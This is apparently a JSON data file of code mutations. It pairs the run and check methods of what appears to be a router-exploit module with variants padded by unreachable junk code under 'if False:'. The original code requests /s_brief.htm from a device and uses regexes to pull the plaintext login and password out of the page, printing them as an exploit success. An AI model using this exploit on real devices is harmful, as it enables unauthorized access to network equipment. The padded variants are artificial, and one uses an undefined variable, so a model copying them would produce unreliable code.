[
    {
        "func_name": "run",
        "original": "def run(self):\n    creds = []\n    print_status('Sending payload request')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return\n    print_status('Extracting credentials')\n    username = re.findall('<input type=\"text\" name=\"szUsername\" size=16 value=\"(.+?)\">', response.text)\n    password = re.findall('<input type=\"password\" name=\"szPassword\" size=16 maxlength=\"16\" value=\"(.+?)\">', response.text)\n    if len(username) and len(password):\n        print_success('Exploit success')\n        creds.append((username[0], password[0]))\n        print_table(('Login', 'Password'), *creds)\n    else:\n        print_error('Exploit failed - could not extract credentials')",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    creds = []\n    print_status('Sending payload request')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return\n    print_status('Extracting credentials')\n    username = re.findall('<input type=\"text\" name=\"szUsername\" size=16 value=\"(.+?)\">', response.text)\n    password = re.findall('<input type=\"password\" name=\"szPassword\" size=16 maxlength=\"16\" value=\"(.+?)\">', response.text)\n    if len(username) and len(password):\n        print_success('Exploit success')\n        creds.append((username[0], password[0]))\n        print_table(('Login', 'Password'), *creds)\n    else:\n        print_error('Exploit failed - could not extract credentials')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    creds = []\n    print_status('Sending payload request')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return\n    print_status('Extracting credentials')\n    username = re.findall('<input type=\"text\" name=\"szUsername\" size=16 value=\"(.+?)\">', response.text)\n    password = re.findall('<input type=\"password\" name=\"szPassword\" size=16 maxlength=\"16\" value=\"(.+?)\">', response.text)\n    if len(username) and len(password):\n        print_success('Exploit success')\n        creds.append((username[0], password[0]))\n        print_table(('Login', 'Password'), *creds)\n    else:\n        print_error('Exploit failed - could not extract credentials')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    creds = []\n    print_status('Sending payload request')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return\n    print_status('Extracting credentials')\n    username = re.findall('<input type=\"text\" name=\"szUsername\" size=16 value=\"(.+?)\">', response.text)\n    password = re.findall('<input type=\"password\" name=\"szPassword\" size=16 maxlength=\"16\" value=\"(.+?)\">', response.text)\n    if len(username) and len(password):\n        print_success('Exploit success')\n        creds.append((username[0], password[0]))\n        print_table(('Login', 'Password'), *creds)\n    else:\n        print_error('Exploit failed - could not extract credentials')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    creds = []\n    print_status('Sending payload request')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return\n    print_status('Extracting credentials')\n    username = re.findall('<input type=\"text\" name=\"szUsername\" size=16 value=\"(.+?)\">', response.text)\n    password = re.findall('<input type=\"password\" name=\"szPassword\" size=16 maxlength=\"16\" value=\"(.+?)\">', response.text)\n    if len(username) and len(password):\n        print_success('Exploit success')\n        creds.append((username[0], password[0]))\n        print_table(('Login', 'Password'), *creds)\n    else:\n        print_error('Exploit failed - could not extract credentials')",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    creds = []\n    print_status('Sending payload request')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return\n    print_status('Extracting credentials')\n    username = re.findall('<input type=\"text\" name=\"szUsername\" size=16 value=\"(.+?)\">', response.text)\n    password = re.findall('<input type=\"password\" name=\"szPassword\" size=16 maxlength=\"16\" value=\"(.+?)\">', response.text)\n    if len(username) and len(password):\n        print_success('Exploit success')\n        creds.append((username[0], password[0]))\n        print_table(('Login', 'Password'), *creds)\n    else:\n        print_error('Exploit failed - could not extract credentials')"
        ]
    },
    {
        "func_name": "check",
        "original": "@mute\ndef check(self):\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return False\n    if 'szUsername' in response.text and 'szPassword' in response.text:\n        return True\n    return False",
        "mutated": [
            "@mute\ndef check(self):\n    if False:\n        i = 10\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return False\n    if 'szUsername' in response.text and 'szPassword' in response.text:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return False\n    if 'szUsername' in response.text and 'szPassword' in response.text:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return False\n    if 'szUsername' in response.text and 'szPassword' in response.text:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return False\n    if 'szUsername' in response.text and 'szPassword' in response.text:\n        return True\n    return False",
            "@mute\ndef check(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    response = self.http_request(method='GET', path='/s_brief.htm')\n    if response is None:\n        return False\n    if 'szUsername' in response.text and 'szPassword' in response.text:\n        return True\n    return False"
        ]
    }
]